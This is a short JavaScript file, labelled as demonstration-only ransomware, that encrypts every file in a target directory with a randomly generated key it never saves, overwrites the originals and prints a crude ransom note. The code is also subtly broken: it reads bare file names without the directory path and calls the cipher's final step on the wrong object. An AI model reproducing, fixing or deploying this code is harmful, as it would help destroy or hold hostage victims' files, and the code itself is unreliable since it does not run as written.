// Ransomware code (for demonstration purposes only)
var fs = require('fs');
var crypto = require('crypto');

// Directory to target for file encryption
var targetDirectory = '/user/files';

// Once the encryption key is generated, the code will read all files in the target directory.
var encryptionKey = crypto.randomBytes(32).toString('hex');

// Read all files in the target directory
fs.readdirSync(targetDirectory).forEach(file => {
  // Skip directories
  if (fs.lstatSync(file).isDirectory()) return;

  // Read file data
  var data = fs.readFileSync(file);

  // Encrypt file data with encryption key
  var encryptedData = crypto
    .createCipher('aes-256-cbc', encryptionKey)
    .update(data, 'utf8', 'hex') +
    crypto.createCipher.final('hex');

  // writing encrypted data back to file
  // Finally, the code will display a ransom note to the user, demanding payment in exchange for the decryption key.

  fs.writeFileSync(file, encryptedData);
});

// Display ransom note to user
var ransomNote = `
Your files have been encrypted!
e.g go fuck off
`;

console.log(ransomNote);
